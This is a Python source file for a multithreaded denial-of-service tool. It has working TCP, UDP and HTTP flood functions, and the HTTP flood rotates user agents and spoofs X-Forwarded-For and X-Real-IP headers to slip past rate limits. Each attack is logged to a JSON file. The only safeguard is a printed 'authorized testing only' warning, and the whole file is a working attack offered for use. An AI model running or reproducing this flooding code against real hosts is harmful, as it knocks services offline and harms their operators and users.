
import os
import socket
import threading
import time
import random
import json
import sys
import requests
from datetime import datetime
def warning_message():
    red = "\033[91m"
    reset = "\033[0m"
    print(f"{red}\n[!] WARNING: This tool is for **authorized testing only**.")
    print("[!] Unauthorized use of this tool is strictly prohibited and may be illegal.\\n" + reset)
    

def load_user_agents(path="config/useragents.txt"):
    if os.path.exists(path):
        with open(path, "r") as f:
            return f.read().splitlines()
    return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"]

user_agents = load_user_agents()

def tcp_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(random._urandom(1024))
            s.close()
        except:
            pass

def udp_flood(target, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        try:
            bytes_ = random._urandom(1024)
            sock.sendto(bytes_, (target, port))
        except:
            pass

def http_flood_requests(target, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*",
                "Connection": "keep-alive",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://google.com",
                "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
                "X-Real-IP": ".".join(str(random.randint(1, 254)) for _ in range(4)),
                "Origin": target
            }
            requests.get(target, headers=headers, timeout=5)
            print(f"[+] Sent request to {target} ")
        except:
            pass

def save_results(target, port, duration, attack_type, threads):
    os.makedirs("output", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"output/ddos-{timestamp}.json"
    data = {
        "target": target,
        "port": port,
        "duration": duration,
        "type": attack_type,
        "threads": threads,
        "timestamp": timestamp
    }
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)
    print(f"[✓] Results saved to {filename}")

def run(target, args):
    warning_message()

    attack_type = getattr(args, "ddos_type", "http").lower()
    port = int(getattr(args, "port", None) or 80)
    duration = int(getattr(args, "duration", None) or 30)
    thread_count = int(getattr(args, "threads", None) or 100)

    print(f"[+] Launching {attack_type.upper()} attack on {target}:{port} for {duration}s with {thread_count} threads")

    if attack_type == "tcp":
        func = tcp_flood
        args_list = [(target, port, duration)] * thread_count
    elif attack_type == "udp":
        func = udp_flood
        args_list = [(target, port, duration)] * thread_count
    elif attack_type == "http":
        if not target.startswith("http"):
            target = f"http://{target}"
        func = http_flood_requests
        args_list = [(target, duration)] * thread_count
    else:
        print("[✘] Invalid attack type. Choose from: tcp | udp | http")
        return

    threads = []
    for args_tuple in args_list:
        t = threading.Thread(target=func, args=args_tuple)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[✓] Attack completed.")
    save_results(target, port, duration, attack_type, thread_count)
